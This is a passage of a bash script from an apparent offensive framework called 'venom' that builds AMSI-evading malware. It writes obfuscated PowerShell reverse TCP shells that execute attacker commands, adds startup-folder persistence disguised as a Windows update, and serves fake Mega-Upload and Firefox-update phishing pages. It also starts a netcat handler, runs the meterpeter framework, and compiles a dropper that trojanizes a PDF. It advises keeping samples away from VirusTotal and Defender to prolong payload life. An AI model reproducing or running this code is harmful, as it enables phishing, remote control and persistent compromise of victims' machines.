      echo "echo :STARTLOOP >> \"%appdata%\\Microsoft\\Windows\\Start Menu\Programs\\Startup\\KB4524147_$Id.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
      echo "echo PoWeRsHeLl -W 1 -File \"$rpath\\$NaM.ps1\" >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$Id.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
      echo "echo timeout /T 8 /NOBREAK ^>nul >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$Id.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
      echo "echo netstat -ano^|findstr /C:\"$lhost:$lport\"^|findstr /C:\"ESTABLISHED\" >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$Id.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
      echo "echo if %%ERRORLEVEL%% EQU 0 (goto :EOF) >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$Id.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
      echo "echo GOTO STARTLOOP >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$Id.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
      echo "echo :EOF >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$Id.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
      echo "echo exit >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$Id.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
   fi
   echo "PoWeRsHeLl -W 1 -File \"$rpath\\$NaM.ps1\"" >> $IPATH/output/$Drop.$ext.bat 
   echo "Timeout /T 2 >nul && Del /F /Q $Drop.$ext.bat" >> $IPATH/output/$Drop.$ext.bat # <-- delete script at the end of execution.
   echo "Exit" >> $IPATH/output/$Drop.$ext.bat
fi


## Client.ps1 obfuscation type (hex|PSrevStr)
ObfuscationType=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nChose the obfuscation method to use:" --radiolist --column "Pick" --column "Option" TRUE "Hex (default)" FALSE "PSrevStr (new)" --width 360 --height 180) > /dev/null 2>&1
if [ "$ObfuscationType" = "PSrevStr (new)" ]; then

   xterm -T " Reversing Original String (ip addr)" -geometry 110x23 -e "rev <<< \"$lhost\" > /tmp/reverse.txt"
   revtcpip=$(cat /tmp/reverse.txt);rm /tmp/reverse.txt > /dev/nul 2>&1
   
   echo "${BlueF}[☠]${white} Obfuscated ip address (rev): ${GreenBg}$revtcpip${white}";sleep 2
   ## Build Reverse TCP Powershell Shell (PSrevStr obfuscated).
   echo "${BlueF}[☠]${white} Writting Reverse Powershell Shell to output ..";sleep 2
   echo "<#" > $IPATH/output/$NaM.ps1
   echo "Obfuscated (rev) Reverse TCP powershell Shell" >> $IPATH/output/$NaM.ps1
   echo "Framework: venom v1.0.17 (shinigami)" >> $IPATH/output/$NaM.ps1
   echo "#>" >> $IPATH/output/$NaM.ps1
   echo "" >> $IPATH/output/$NaM.ps1
   echo "\$MyVault = \"tneilCpcT.stekcoS.teN\";\$CertificatePem = \$MyVault.ToCharArray();" >> $IPATH/output/$NaM.ps1
   echo "[Array]::Reverse(\$CertificatePem);\$CmdLine = (\$CertificatePem -Join '');" >> $IPATH/output/$NaM.ps1
   echo "\$Cofre = \"$revtcpip\";\$MyChave = \$Cofre.ToCharArray();" >> $IPATH/output/$NaM.ps1
   echo "[Array]::Reverse(\$MyChave);\$RSAx504 = (\$MyChave -Join '');" >> $IPATH/output/$NaM.ps1
   echo "Start-Sleep -Milliseconds 150" >> $IPATH/output/$NaM.ps1
   echo "" >> $IPATH/output/$NaM.ps1
   echo "\$TORproxy = New-Object System.\$CmdLine(\$RSAx504, $lport);" >> $IPATH/output/$NaM.ps1
   echo "\$DataRaw = \$TORproxy.GetStream();" >> $IPATH/output/$NaM.ps1
   echo "[byte[]]\$bytes = 0..65535|%{0};" >> $IPATH/output/$NaM.ps1
   echo "" >> $IPATH/output/$NaM.ps1
   echo "while((\$iO = \$DataRaw.Read(\$bytes, 0, \$bytes.Length)) -ne 0){" >> $IPATH/output/$NaM.ps1
   echo "   \$FTPdata = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$iO);" >> $IPATH/output/$NaM.ps1
   echo "   \$sendTO = (iex \$FTPdata 2>&1 | Out-String);" >> $IPATH/output/$NaM.ps1
   echo "   \$TCPReturn = \$sendTO + '[' + (hostname) + '] ' + (pwd).Path + '> ';" >> $IPATH/output/$NaM.ps1
   echo "   \$sendbyte = ([text.encoding]::ASCII).GetBytes(\$TCPReturn);" >> $IPATH/output/$NaM.ps1
   echo "   \$DataRaw.Write(\$sendbyte,0,\$sendbyte.Length);" >> $IPATH/output/$NaM.ps1
   echo "   \$DataRaw.Flush();" >> $IPATH/output/$NaM.ps1
   echo "}" >> $IPATH/output/$NaM.ps1
   echo "\$TORproxy.Close();" >> $IPATH/output/$NaM.ps1

else

   ## Convert attacker ip address to hex
   echo "${BlueF}[☠]${white} Converting ip address to hex ..${white}";sleep 2
   one=$(echo $lhost|cut -d '.' -f1)
   two=$(echo $lhost|cut -d '.' -f2)
   tre=$(echo $lhost|cut -d '.' -f3)
   four=$(echo $lhost|cut -d '.' -f4)
   Hex=$(printf "%x,%x,%x,%x\n" $one $two $tre $four)
   um=$(echo $Hex|cut -d ',' -f1)
   dois=$(echo $Hex|cut -d ',' -f2)
   tres=$(echo $Hex|cut -d ',' -f3)
   quato=$(echo $Hex|cut -d ',' -f4)
   strip="\"$um\"","\"$dois\"","\"$tres\"","\"$quato\"";hexed=$strip
   echo "${BlueF}[☠]${white} Obfuscated ip addr (hex):${GreenF}$hexed${white}";sleep 2

   ## Build Reverse TCP Powershell Shell (hex obfuscated).
   echo "${BlueF}[☠]${white} Writting Reverse Powershell Shell to output ..";sleep 2
   echo "<#" > $IPATH/output/$NaM.ps1
   echo "Obfuscated (hex) Reverse Powershell Shell" >> $IPATH/output/$NaM.ps1
   echo "Framework: venom v1.0.17 (shinigami)" >> $IPATH/output/$NaM.ps1
   echo "Original shell: Paranoid Ninja" >> $IPATH/output/$NaM.ps1
   echo "#>" >> $IPATH/output/$NaM.ps1
   echo "" >> $IPATH/output/$NaM.ps1
   echo "while (\$true) {\$px = $hexed;\$p = (\$px | ForEach { [convert]::ToInt32(\$_,16) }) -join '.';\$w = \"GET /index.html HTTP/1.1\`r\`nHost: \$p\`r\`nMozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0\`r\`nAccept: text/html\`r\`n\`r\`n\";\$s = [System.Text.ASCIIEncoding];[byte[]]\$b = 0..65535|%{0};\$x = \"n-eiorvsxpk5\";Set-alias \$x (\$x[\$true-10] + (\$x[[byte](\"0x\" + \"FF\") - 265]) + \$x[[byte](\"0x\" + \"9a\") - 158]);\$y = New-Object System.Net.Sockets.TCPClient(\$p,$lport);\$z = \$y.GetStream();\$d = \$s::UTF8.GetBytes(\$w);\$z.Write(\$d, 0, \$d.Length);\$t = (n-eiorvsxpk5 whoami) + \"> \";while((\$l = \$z.Read(\$b, 0, \$b.Length)) -ne 0){;\$v = (New-Object -TypeName \$s).GetString(\$b,0, \$l);\$d = \$s::UTF8.GetBytes((n-eiorvsxpk5 \$v 2>&1 | Out-String )) + \$s::UTF8.GetBytes(\$t);\$z.Write(\$d, 0, \$d.Length);}\$y.Close();Start-Sleep -Seconds 3}" >> $IPATH/output/$NaM.ps1

fi

## Building the Download Webpage Sellected.
echo "${BlueF}[☠]${white} Building HTTP Download WebPage (apache2) .."${Reset};sleep 2
phish=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Download Pages:" --radiolist --column "Pick" --column "Option" TRUE "Mega-Upload (default)" FALSE "Cumulative Security Update" --width 350 --height 200) > /dev/null 2>&1
if [ "$phish" = "Mega-Upload (default)" ]; then
    cd $IPATH/templates/phishing
   sed "s|NaM3|http://$lhost/$Drop.zip|g" mega.html > MegaUpload.html
   mv MegaUpload.html $ApAcHe/MegaUpload.html > /dev/nul 2>&1
else
   cd $IPATH/templates/phishing/firefox
   sed "s|NaM3|http://$lhost/$Drop.zip|g" FakeUpdate.html > Download.html
   mv Download.html $ApAcHe/Download.html > /dev/nul 2>&1
   cp -r FakeUpdate_files $ApAcHe/FakeUpdate_files > /dev/nul 2>&1
fi
cd $IPATH


cd $IPATH/output
## Copy ALL files to apache2 webroot 
zip $Drop.zip $Drop.$ext.bat > /dev/nul 2>&1
echo "${BlueF}[☠]${white} Porting ALL required files to apache2 .."${Reset};sleep 2
cp $IPATH/output/$NaM.ps1 $ApAcHe/$NaM.ps1 > /dev/nul 2>&1
cp $IPATH/output/$Drop.zip $ApAcHe/$Drop.zip > /dev/nul 2>&1
cp $IPATH/aux/webserver.ps1 $ApAcHe/webserver.ps1 > /dev/nul 2>&1
cd $IPATH


## Print attack vector on terminal
echo "${BlueF}[${GreenF}✔${BlueF}]${white} Starting apache2 webserver ..";sleep 2
echo "${BlueF}---"
echo "${BlueF}- ${RedBg}SEND THE URL GENERATED TO TARGET HOST${Reset}"
if [ "$phish" = "Mega-Upload (default)" ]; then
   echo "${BlueF}- ${YellowF}ATTACK VECTOR:${BlueF} http://$lhost/MegaUpload.html"
else
   echo "${BlueF}- ${YellowF}ATTACK VECTOR:${BlueF} http://$lhost/Download.html"
fi
echo "${BlueF}- CmdLine(s) & Scripts: https://rb.gy/68ow4q"
echo "${BlueF}---"${Reset};
echo -n "${BlueF}[☠]${white} Press any key to start a handler .."
read odf
rm $IPATH/output/$NaM.ps1 > /dev/nul 2>&1
cd $IPATH/output
## START NETCAT HANDLER ON SELLECTED PORT NUMBER
# xterm -T " NETCAT LISTENER => $lhost:$lport" -geometry 110x23 -e "sudo nc -lvvp $lport"
gnome-terminal --title="NETCAT LISTENER => $lhost:$lport" --geometry=90x21 --wait -- sh -c "sudo nc -lvvp $lport" > /dev/null 2>&1
cd $IPATH
sleep 2


## Clean old files.
echo "${BlueF}[☠]${white} Please Wait, cleaning old files ..${white}";sleep 2
rm $ApAcHe/$NaM.ps1 > /dev/nul 2>&1
rm $ApAcHe/$Drop.zip > /dev/nul 2>&1
rm $ApAcHe/Download.html > /dev/nul 2>&1
rm $IPATH/output/$NaM.ps1 > /dev/nul 2>&1
rm $IPATH/output/$Drop.zip > /dev/nul 2>&1
rm $ApAcHe/MegaUpload.html > /dev/nul 2>&1
rm $ApAcHe/webserver.ps1 > /dev/nul 2>&1
rm -r $ApAcHe/FakeUpdate_files > /dev/nul 2>&1


cd $IPATH/output
## Persistence handler script (zip) creation ..
if [ "$persistence" = "Add persistence" ]; then

   dtr=$(date|awk {'print $2,$3,$4,$5'})
   cp $IPATH/bin/handlers/handler2.sh $IPATH/output/handler.sh
   ## Config handler script variable declarations ..
   two=$(cat handler.sh | egrep -m 1 "ID") > /dev/null 2>&1
   sed -i "s|$two|ID='$Id'|" handler.sh
   tree=$(cat handler.sh | egrep -m 1 "CLIENT") > /dev/null 2>&1
   sed -i "s|$tree|CLIENT='$NaM.ps1'|" handler.sh
   four=$(cat handler.sh | egrep -m 1 "LPORT") > /dev/null 2>&1
   sed -i "s|$four|LPORT='$lport'|" handler.sh
   five=$(cat handler.sh | egrep -m 1 "LHOST") > /dev/null 2>&1
   sed -i "s|$five|LHOST='$lhost'|" handler.sh
   seven=$(cat handler.sh | egrep -m 1 "RPATH") > /dev/null 2>&1
   sed -i "s|$seven|RPATH='$rpath\\\\$NaM.ps1'|" handler.sh
   oito=$(cat handler.sh | egrep -m 1 "FIRST_ACCESS") > /dev/null 2>&1
   sed -i "s|$oito|FIRST_ACCESS='$dtr'|" handler.sh
   nove=$(cat handler.sh | egrep -m 1 "DROPPER") > /dev/null 2>&1
   sed -i "s|$nove|DROPPER='$Drop.$ext.bat'|" handler.sh

   ## Obfuscation=on (vbs persistence script)
   if [ "$easter_egg" = "ON" ] || [ "$easter_egg" = "on" ]; then
      sed -i "s|.update.bat|.update.vbs|" handler.sh
   fi

   ## Client.ps1 (Agent) obfuscation type
   if [ "$ObfuscationType" = "PSrevStr (new)" ]; then
      sed -i "s|DESCRIPTION : Reverse TCP PS Shell (hex)|DESCRIPTION : Reverse TCP PS Shell (rev)|" handler.sh
   fi

   ## Write README file (to be compressed)
   echo "Id          : $Id" > README
   if [ "$ObfuscationType" = "PSrevStr (new)" ]; then
      echo "Description : Reverse Powershell Shell (rev obfuscation)" >> README
   else
      echo "Description : Reverse Powershell Shell (hex obfuscation)" >> README
   fi
   echo "Categorie   : Amsi Evasion (agent nº3)" >> README
   echo "Active On   : $dtr" >> README
   echo "Lhost|Lport : $lhost:$lport" >> README
   echo "" >> README
   echo "Instructions" >> README
   echo "------------" >> README
   echo "1 - cd output" >> README
   echo "2 - unzip handler_ID:$Id.zip" >> README
   echo "3 - sh handler.sh" >> README
   echo "" >> README
   echo "Detail Description" >> README
   echo "------------------" >> README
   echo "If sellected 'add persistence' to dropper in venom amsi evasion" >> README
   echo "agent nº3 build. Them the dropper when executed it will create in" >> README
   echo "remote target startup folder a script named 'KB4524147_$Id.update.bat'" >> README
   echo "that beacons home from 8 to 8 sec until a valid tcp connection is found" >> README
   echo "and creates this handler file (zip) to store attacker handler settings." >> README

   ## zip handler files
   echo "${BlueF}[${YellowF}i${BlueF}]${YellowF} Compressing (zip) handler files .."${Reset};sleep 2
   zip handler_ID:$Id.zip handler.sh README -m -q
   cd $IPATH
   zenity --title="☠ Reverse TCP Powershell Shell (hex|PSrevStr obfuscation) ☠" --text "Persistence handler files stored under:\n$IPATH/output/handler_ID:$Id.zip" --info --width 340 --height 130 > /dev/null 2>&1
else
   ## Delete certs IF persitence was NOT sellected.
   rm $IPATH/output/cert.pem > /dev/nul 2>&1
   rm $IPATH/output/key.pem > /dev/nul 2>&1
fi
cd $IPATH
sh_menu
}




# ------------------------------------------
# meterpeter PS Reverse TCP Shell/Client
# https://github.com/r00t-3xp10it/meterpeter
# ------------------------------------------
sh_evasion4 () {
Colors;

## Check for Attacker arch dependencie
# M$ only supports PS under x64 bit systems
if [ "$ArCh" = "x86" ]; then
  echo "${RedBg}[error] This Module does not run under [32 bit]"${Reset};sleep 1
  echo "${BlueF}---"
  echo "- meterpeter Framework Depends of Powershell (pwsh) installed Under"
  echo "- Linux Distros. But \$Microsoft Only provides pwsh to Linux x64 bits"
  echo "- 'For that reason venom its impotent to do anything more '..."
  echo "---"${Reset};
  echo "${BlueF}[☠]${white} Press [Enter] to return to amsi menu ..";
  read op;clear;sh_ninja
else
  echo "${BlueF}[☠]${white} Correct Arch [${GreenBg}$ArCh${white}] Found .."${Reset};sleep 1
fi


## Check if PS its installed
# Powershell under x64 Linux Distros (pwsh)
ps_test=$(which pwsh)
if ! [ "$?" -eq "0" ]; then
   echo "${RedBg}[error] Powershell not found (pwsh) .."${Reset};
   echo "${BlueF}---"
   echo "- meterpeter Framework Depends of Powershell (pwsh) installed under"
   echo "- Linux Distros. Venom will try to auto-Install all dependencies .."
   echo "---"${Reset};
   echo "${BlueF}[${YellowF}i${BlueF}]${white} Please Wait, installing dependencies .."${Reset};sleep 2
   echo ""
   sudo apt-get update && apt-get -y install powershell
   echo ""
     ## try again now
     second_test=$(which pwsh)
     if ! [ "$?" -eq "0" ]; then
        echo "${RedBg}[error] Venom Cant install powershell (pwsh)"${Reset};sleep 2
        echo "${RedF}[x] Powershell Default Dir: /usr/bin/pwsh"${Reset};
        echo "${BlueF}[☠]${white} Press [Enter] to return to amsi menu ..";
        read op;clear;sh_ninja
     else
        echo "${BlueF}[${YellowF}i${BlueF}]${white} Venom Reports that pwsh was successfull installed."${Reset};
        sleep 3
     fi
else
  echo "${BlueF}[☠]${white} Powershell Linux [pwsh] Found .."${Reset};sleep 1
fi


## WARNING ABOUT SCANNING SAMPLES (VirusTotal)
echo "---"
echo "${white}- ${RedBg}WARNING ABOUT SCANNING SAMPLES (VirusTotal)"${Reset};
echo "- Please Dont test samples on Virus Total or on similar";
echo "- online scanners, because that will shorten the payload life.";
echo "- And in testings also remmenber to stop the windows defender";
echo "- from sending samples to \$Microsoft..";
echo "---"
sleep 2


## Store User Inputs (bash variable declarations)..
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
Obtype=$(zenity --list --title "☠ OBFUSCATION MODULE ☠" --text "\nAvailable Obfuscation Methods:" --radiolist --column "Pick" --column "Option" TRUE "ASCII" FALSE "BXOR" --width 350 --height 200) > /dev/null 2>&1
## Setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$Obtype" ]; then Obtype="ASCII";fi


## meterpeter project
# Config meterpeter Settings File & exec PS1 (Server)
if ! [ -d "$IPATH/bin/meterpeter" ]; then
  echo "${RedBg}[errot] Abort, meterpeter Project not Found .."${Reset};
  echo "${RedF}[x] Local Path: $IPATH/bin/meterpeter"${Reset};sleep 2
  echo "${BlueF}[${YellowF}i${BlueF}]${white} https://github.com/r00t-3xp10it/meterpeter";
  echo "${BlueF}[☠]${white} Press [Enter] to return to amsi menu ..";
  read op;clear;sh_ninja
else
  cd $IPATH/bin/meterpeter
  ## Config 'meterpeter' Settings File
  echo "${BlueF}[${YellowF}i${BlueF}] meterpeter Working Dir:${GreenF} '$IPATH/bin/meterpeter'"${Reset};sleep 2
  if [ "$Obtype" = "ASCII" ]; then Obtype="1";else Obtype="2";fi
  set_ip=$(cat Settings.txt|grep -m 1 'IP'|cut -d ':' -f2)
  set_port=$(cat Settings.txt|grep -m 1 'PORT'|cut -d ':' -f2)
  set_obfs=$(cat Settings.txt|grep -m 1 'OBFUS'|cut -d ':' -f2)
  ## Renew Settings File using bash 'sed'
  sed -i "s|$set_ip|$lhost|" Settings.txt
  sed -i "s|$set_port|$lport|" Settings.txt
  sed -i "s|$set_obfs|$Obtype|" Settings.txt
  ## Run meterpeter binary (ps1)
  dtr=$(date|awk {'print $2,$3,$4,$5'})
  echo "${BlueF}[☠]${white} [${YellowF}$dtr${white}] Runing meterpeter Framework .."${Reset};sleep 2
  # gnome-terminal --title "meterpeter (Server)" --window --maximize -x bash -c 'pwsh -File meterpeter.ps1'
  pwsh -File meterpeter.ps1
  cd $IPATH
fi


## Build Handler file (output folder)
## Generate Random {6 chars} Handler Name.
if [ -e "$IPATH/bin/meterpeter/Update-KB4524147.ps1" ]; then
   random_name=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 6 | head -n 1)
   ## Write handler file to venom output folder
   echo "${BlueF}[${YellowF}i${BlueF}]${white} Handler:${GreenF} $IPATH/output/meterpeter_$random_name.handler"${Reset};sleep 2
   echo "LPORT  :$lport" >> $IPATH/output/meterpeter_$random_name.handler
   echo "LHOST  :$lhost" >> $IPATH/output/meterpeter_$random_name.handler
   echo "DATE   :$dtr" >> $IPATH/output/meterpeter_$random_name.handler
   echo "HANDLER:cd output" >> $IPATH/output/meterpeter_$random_name.handler
   echo "HANDLER:sudo nc -lvvp $lport" >> $IPATH/output/meterpeter_$random_name.handler
fi


cd $IPATH
## Clean old files/configs ..
echo "${BlueF}[☠]${white} Please Wait, Cleaning old conf files .."${Reset};sleep 2
rm $IPATH/bin/meterpeter/Update-KB4524147.ps1 > /dev/nul 2>&1
rm $IPATH/bin/meterpeter/test.txt > /dev/nul 2>&1
rm $ApAcHe/Update-KB4524147.ps1 > /dev/nul 2>&1
rm $ApAcHe/Update-KB4524147.zip > /dev/nul 2>&1

## Jump to Main menu
sleep 3
sh_menu
}



# ------------------------------------------
# PDF Trojan Horse (social enginering)
# https://github.com/r00t-3xp10it/venom/wiki/Venom---Amsi-Evasion---agent-n%C2%BA5-(PDF-Trojan)
# ------------------------------------------
sh_evasion5 () {
Colors;

## WARNING ABOUT SCANNING SAMPLES (VirusTotal)
echo "---"
echo "${white}- ${RedBg}WARNING ABOUT SCANNING SAMPLES (VirusTotal)"${Reset};
echo "- Please Dont test samples on Virus Total or on similar"${Reset};
echo "- online scanners, because that will shorten the payload life."${Reset};
echo "- And in testings also remmenber to stop the windows defender"${Reset};
echo "- from sending samples to \$Microsoft.. (just in case)."${Reset};
echo "---"
sleep 2


# ----------------- Dependencies Checks -----------------


## Make Sure all dependencies are meet
# check if mingw32 OR mingw-W64 GCC library exists
if [ "$arch" = "wine64" ]; then report="mingw-W64"; else report="mingw32";fi
echo "${BlueF}[${YellowF}i${BlueF}]${white} Checking Module Dependencies.${white}";sleep 2
audit=$(which $ComP) > /dev/null 2>&1
if [ "$?" -ne "0" ]; then
   echo "${RedF}[ERROR] $report GCC compiler not found ($ComP)${white}"
   echo "${BlueF}[${YellowF}i${BlueF}]${white} Info: https://github.com/r00t-3xp10it/venom/wiki/Venom---Amsi-Evasion---agent-n%C2%BA5-(PDF-Trojan)";sleep 2
   if [ "$ArCh" = "x64" ]; then
      echo "${BlueF}[${YellowF}i${BlueF}]${white} Please Wait, Installing GCC compiler."
      echo "" && sudo apt-get update && apt-get install -y mingw-w64 && echo ""
      ComP="i686-w64-mingw32-gcc" # GCC library used to compile binary
   else
      echo "${BlueF}[${YellowF}i${BlueF}]${white} Please Wait, Installing GCC compiler."
      echo "" && sudo apt-get update && apt-get install -y mingw32 && echo ""
      ComP="i586-mingw32msvc-gcc" # GCC library used to compile binary
   fi
fi


## Activating Wine Multi-Arch Support in x64 distros
# WINEARCH=win32 WINEPREFIX=/root/.wine32 winecfg
audit=$(which wine) > /dev/null 2>&1
if [ "$?" -ne "0" ]; then
   echo "${RedF}[ERROR] none wine installation found.${white}";sleep 2
   echo "${BlueF}[${YellowF}i${BlueF}]${white} Please Wait, Installing wine."
   echo "" && sudo apt-get update && apt-get install -y wine && winecfg && echo ""
fi

if [ -e "$IPATH/aux/WineMultiArch" ]; then
   rootwine=$(cat $IPATH/aux/WineMultiArch|sed "s| ||g") # read wine full path from WineMultiArch file
else
   askpath=$(zenity --title="☠ Enter the location of .wine directory ☠" --text "example: /root/.wine\nexample: /home/pedro/.wine" --entry --width 300) > /dev/null 2>&1
   rootwine=$(echo $askpath|cut -d '.' -f1)    # set 'first time run' wine full path variable declaration.
   echo "$rootwine" > $IPATH/aux/WineMultiArch # write WineMultiArch file, to prevent this ZENITY question again
fi

if [ "$ArCh" = "x64" ]; then # 64-bit configurations
   if [ ! -d "$rootwine.wine32" ]; then
      echo "${RedF}[ERROR] $rootwine.wine32 directory not found.${white}"
      echo "${BlueF}[${YellowF}i${BlueF}]${white} Info: https://github.com/r00t-3xp10it/venom/wiki/Venom---Amsi-Evasion---agent-n%C2%BA5-(PDF-Trojan)"
      echo "${BlueF}[${YellowF}i${BlueF}]${white} Please Wait, Installing wine32:i386";sleep 2
      echo ""
      sudo dpkg --add-architecture i386 && sudo apt-get update
      sudo apt-get -y dist-upgrade --allow-downgrades
      sudo apt-get install -y wine wine32:i386 wine64 libwine libwine:i386 fonts-wine winbind winetricks
      echo ""

      echo "${BlueF}[${YellowF}i${BlueF}]${white} Activating Wine Multi-Arch Support."
      if [ ! -d "/run/user/0/" ]; then sudo mkdir -p /run/user/0/;fi
      sudo WINEARCH=win32 WINEPREFIX=$rootwine.wine32 winecfg

      cd $IPATH/bin
      echo "${BlueF}[${YellowF}i${BlueF}]${white} Installing wine-mono-4.9.4 (msi)"
      echo "" && wget https://dl.winehq.org/wine/wine-mono/4.9.4/wine-mono-4.9.4.msi && echo ""
      echo "" && wine msiexec /i wine-mono-4.9.4.msi && echo ""
      multiArch="TRUE"
      cd $IPATH

   else

      echo "${BlueF}[${YellowF}i${BlueF}]${white} Activating Wine Multi-Arch Support."
      sudo WINEARCH=win32 WINEPREFIX=$rootwine.wine32 winecfg
      multiArch="TRUE"
   fi

elif [ "$ArCh" = "x86" ]; then # 32-bit configurations

   if [ ! -d "$rootwine.wine" ]; then
      echo "${RedF}[ERROR] $rootwine.wine directory not found.${white}"
      echo "${BlueF}[${YellowF}i${BlueF}]${white} Info: https://github.com/r00t-3xp10it/venom/wiki/Venom---Amsi-Evasion---agent-n%C2%BA5-(PDF-Trojan)"
      echo "${BlueF}[${YellowF}i${BlueF}]${white} Please Wait, Installing wine";sleep 2
      echo "" && sudo apt-get update && apt-get install -y wine && winecfg && echo ""
      multiArch="FALSE"
   fi

else # none .wine OR .wine32 folder's found

   echo "${RedF}[ERROR] Aborting: /???/.wine directory not found.${white}";sleep 2
   exit
fi


## check if ResourceHacker.exe (wine) exists
if [ -d "$rootwine.wine32" ]; then # x64 bit system

   multiwine="$rootwine.wine32/drive_c/$PgFi/Resource Hacker/ResourceHacker.exe"
   if [ ! -f "$multiwine" ]; then
      echo "${RedF}[ERROR] ResourceHacker.exe (wine32) not found.${white}"
      echo "${BlueF}[${YellowF}i${BlueF}]${white} Info: https://github.com/r00t-3xp10it/venom/wiki/Venom---Amsi-Evasion---agent-n%C2%BA5-(PDF-Trojan)";sleep 2
      cd $IPATH/bin
      echo "" && wine reshacker_setup.exe && echo ""
      cd $IPATH
   fi

elif [ -d "$rootwine.wine" ]; then # x86 bit system

   multiwine="$rootwine.wine/drive_c/$PgFi/Resource Hacker/ResourceHacker.exe"
   if [ ! -f "$multiwine" ]; then
      echo "${RedF}[ERROR] ResourceHacker.exe (wine) not found.${white}"
      echo "${BlueF}[${YellowF}i${BlueF}]${white} Info: https://github.com/r00t-3xp10it/venom/wiki/Venom---Amsi-Evasion---agent-n%C2%BA5-(PDF-Trojan)";sleep 2
      cd $IPATH/bin
      echo "" && wine reshacker_setup.exe && echo ""
      cd $IPATH
   fi

else # none .wine folder found

   echo "${RedF}[ERROR] Not Found => $rootwine.wine OR $rootwine.wine32 (multi-arch) ${white}"
   echo "${RedF}[ERROR]${white} Not Found => $multiwine ${white}"
   echo "${BlueF}[${YellowF}i${BlueF}]${white} Info: https://github.com/r00t-3xp10it/venom/wiki/Venom---Amsi-Evasion---agent-n%C2%BA5-(PDF-Trojan)";sleep 2
   exit
fi


# -------------------------------------------------------


## Store User Inputs (module bash variable declarations)..
easter_egg=$(cat $IPATH/settings|grep -m 1 'OBFUSCATION'|cut -d '=' -f2)
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 443" --entry --width 300) > /dev/null 2>&1
UpL=$(zenity --title "☠ CHOSE ONE PDF DOC TO BE TROJANIZED ☠" --filename=$IPATH --file-selection --text "Input one PDF document to be embbebed with our revshell") > /dev/null 2>&1
## Make sure attacker have sellected one PDF doc
TestExtension=$(echo $UpL|cut -d '.' -f2)    # store extension sellection
FullName=$(echo "${UpL##*/}"|cut -d '.' -f1) # store filename  sellection
if [ "$TestExtension" != "pdf" ]; then
   echo "${RedBg}[ERROR] This Module requires one PDF document to trojanize.${white}";sleep 2
   echo "${RedF}[x]${white} The File Extension chosen: ${BlueF}$FullName${RedF}.$TestExtension ${white}its NOT Accepted.${white}"
   exit
fi
Drop=$(zenity --title="☠ Enter DROPPER FILENAME ☠" --text "example: Curriculum\nWarning: Allways Start FileNames With 'Capital Letters'\n\nIf 'FileName' input its leave blank, then venom will\nuse the pdf 'FileName' to rename the dropper.exe" --entry --width 300) > /dev/null 2>&1
rpath=$(zenity --title="☠ Enter Files Upload Path (remote dir) ☠" --text "example: %tmp% (*)\nexample: %LocalAppData%\n\n(*) Recomended Path For Upload our files.\nRemark: Only CMD environment var's accepted" --entry --width 350) > /dev/null 2>&1

## Setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$rpath" ]; then rpath="%tmp%";fi
if [ -z "$Drop" ]; then Drop="$FullName";fi
wvd=$(echo $rpath|sed "s|^[%]|\$env:|"|sed "s|%||")
if [ "$easter_egg" = "ON" ]; then Lol="bitsadmin";else Lol="Powershell";fi

## Display final settings to user.
echo "${BlueF}[${YellowF}i${BlueF}]${white} AMSI MODULE SETTINGS"${Reset};sleep 2
echo ${BlueF}"---"
cat << !
    LPORT    : $lport
    LHOST    : $lhost
    LOLBin   : $Lol (DownloadFile)
    DROPPER  : $IPATH/output/$Drop.exe
    PDFdoc   : $IPATH/output/$Drop.pdf
    AGENT    : $IPATH/output/Client.exe
    UPLOADTO : $rpath => ($wvd)
!
echo "---"


cd $IPATH/output
## BUILD DROPPER (to download/execute our legit pdf and agent.ps1).
echo "${BlueF}[☠]${white} Creating dropper C Program."${Reset};sleep 2
cp $UpL $IPATH/output/$Drop.pdf # Copy/rename legit pdf to output folder
if [ "$easter_egg" = "ON" ]; then
   cp $IPATH/templates/dropperTWO.c $IPATH/output/dropper.c
else
   cp $IPATH/templates/dropper.c $IPATH/output/dropper.c
fi
sed -i "s|LhOsT|$lhost|g" dropper.c
sed -i "s|LpOrT|$lport|g" dropper.c
sed -i "s|FiLNaMe|$Drop|g" dropper.c
sed -i "s|TempDir|$rpath|g" dropper.c
if [ "$easter_egg" = "ON" ]; then sed -i "s|FiNaL|$wvd|g" dropper.c;fi


## COMPILING C Program USING mingw32 OR mingw-W64
echo "${BlueF}[☠]${white} Compiling dropper using mingw32."${Reset};sleep 2
# special thanks to astr0baby for mingw32 -mwindows -lws2_32 flag :D
$ComP dropper.c -o $Drop.exe -lws2_32 -mwindows
rm $IPATH/output/dropper.c > /dev/nul 2>&1


## Use resourceHacker (wine32) to change the dropper.exe icon
echo "${BlueF}[☠]${white} Changing dropper.exe icon (RH)"${Reset};
